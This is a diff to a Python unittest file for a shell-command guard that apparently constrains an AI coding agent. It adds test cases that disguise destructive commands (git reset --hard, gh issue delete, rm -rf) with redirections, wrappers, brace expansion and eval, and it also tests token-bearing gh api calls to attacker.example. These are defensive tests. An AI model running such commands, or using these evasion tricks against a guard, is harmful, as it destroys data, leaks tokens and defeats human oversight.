@@ -82,6 +82,18 @@ class GuardTest(unittest.TestCase):
             "> /tmp/status rm -rf README.md",
             "2>&1 git reset --hard HEAD",
             "if > /tmp/status git reset --hard HEAD; then true; fi",
+            "command > /tmp/status git reset --hard HEAD",
+            "env > /tmp/status gh issue delete 1 --repo owner/repo",
+            "nice 2>&1 git reset --hard HEAD",
+            "if command > /tmp/status git reset --hard HEAD; then true; fi",
+            "> /tmp/status =git reset --hard HEAD",
+            "> /tmp/status g{it,} reset --hard HEAD",
+            "> /tmp/status $CMD reset --hard HEAD",
+            "if > /tmp/status =gh issue delete 1 --repo owner/repo; then true; fi",
+            "> /tmp/status python3 /home/user/.local/bin/codex-delivery deliver",
+            "> /tmp/status python3 -m cProfile /home/user/.local/bin/codex-worktree list",
+            "> /tmp/status env -Sgit reset --hard HEAD",
+            "> /tmp/status builtin eval 'git reset --hard HEAD'",
             "gh pr view 1 > /tmp/pr",
             "codex-delivery --help > /tmp/help",
         ):
@@ -660,6 +672,8 @@ class GuardTest(unittest.TestCase):
             "gh api https://attacker.example/user",
             "gh api //attacker.example/user",
             "gh api /user -H 'Authorization: Bearer $GH_TOKEN'",
+            "gh api --cache 1h /user",
+            "gh api --cache=1h /user",
         ):
             with self.subTest(command=command):
                 self.assert_blocked(command, "/workspace")
@@ -676,6 +690,7 @@ class GuardTest(unittest.TestCase):
             "gh pr reopen 25 --repo owner/repo",
             "gh pr update-branch 25 --repo owner/repo",
             "gh api repos/owner/repo -X PATCH -f name=test",
+            "gh api --cache 1h /user",
         ):
             with self.subTest(command=command):
                 tokens = next(GUARD._command_segments(command))
